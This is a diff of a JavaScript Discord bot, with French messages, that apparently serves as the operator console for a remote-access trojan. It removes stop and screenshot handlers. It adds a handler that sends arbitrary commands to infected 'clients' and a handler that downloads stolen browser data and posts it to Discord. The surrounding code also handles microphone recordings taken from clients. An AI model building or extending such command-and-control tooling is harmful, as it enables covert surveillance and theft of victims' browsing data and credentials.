@@ -46,25 +46,6 @@ export const handleClientsCommand = async (interaction) => {
     }
 };
 
-export const handleStopCommand = async (interaction) => {
-    await interaction.deferReply({ ephemeral: true });
-    await interaction.editReply('Arrêt du bot...');
-    process.exit(0);
-};
-
-export const handleScreenshotCommand = async (interaction) => {
-    const clientId = interaction.options.getString('client_id');
-    await interaction.deferReply({ ephemeral: true });
-    const url = `${API_BASE_URL}/command/${clientId}`;
-    try {
-        await executeRequestWithTokenRefresh(url, { method: 'POST', data: { command: 'screenshot' } });
-        await interaction.editReply(`${commands.find(command => command.name === 'screenshot').description}`);
-    } catch (error) {
-        console.error("Erreur lors de l'envoi de la commande", error);
-        await interaction.editReply("Erreur lors de l'envoi de la commande.");
-    }
-}
-
 export const handleMicrophoneCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     const duration = interaction.options.getInteger('duration');
@@ -97,6 +78,26 @@ export const handleMicrophoneCommand = async (interaction) => {
         clearInterval(intervalId);
     }
 };
+
+export const handleSendCommand = async (interaction) => {
+    const clientId = interaction.options.getString('client_id');
+    const command = interaction.options.getString('command');
+    const args = interaction.options.getString('args');
+    await interaction.deferReply({ ephemeral: true });
+
+    const url = `${API_BASE_URL}/command/${clientId}`;
+    const data = {
+        command: command
+    };
+
+    try {
+        await executeRequestWithTokenRefresh(url, { method: 'POST', data });
+        await interaction.editReply(`Commande envoyée au client ${clientId} : ${command}`);
+    } catch (error) {
+        console.error("Erreur lors de l'envoi de la commande", error);
+        await interaction.editReply("Erreur lors de l'envoi de la commande.");
+    }
+}
 
 export const handleListAllScreenshotsCommand = async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
@@ -159,3 +160,32 @@ export const handleListAllMicrophonesCommand = async (interaction) => {
         await interaction.editReply("Erreur lors de la récupération des clients.");
     }
 };
+
+export const handleListBrowserDataCommand = async (interaction) => {
+    await interaction.deferReply({ ephemeral: true });
+    try {
+        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/browser/client/${interaction.options.getString('client_id')}/${interaction.options.getString('browser')}`);
+        const browserData = response.data;
+
+        if (browserData.length === 0) {
+            await interaction.editReply("Aucune donnée de navigation disponible pour ce client.");
+            return;
+        }
+
+        const files = [];
+        for (const data of browserData) {
+            const responseFile = await executeRequestWithTokenRefresh(`${API_BASE_URL}/browser/data/${data.id}`, { responseType: 'text' });
+            let filename = `${data.file_path.split('/').pop()}`;
+            files.push({ attachment: Buffer.from(responseFile.data, 'utf-8'), name: `${filename}` });
+        }
+
+        await interaction.editReply({
+            content: `Données de navigation pour le client ${interaction.options.getString('client_id')} :`,
+            files: files
+        });
+    }
+    catch (error) {
+        console.error("Erreur lors de la récupération des données de navigation", error);
+        await interaction.editReply("Erreur lors de la récupération des données de navigation.");
+    }
+}
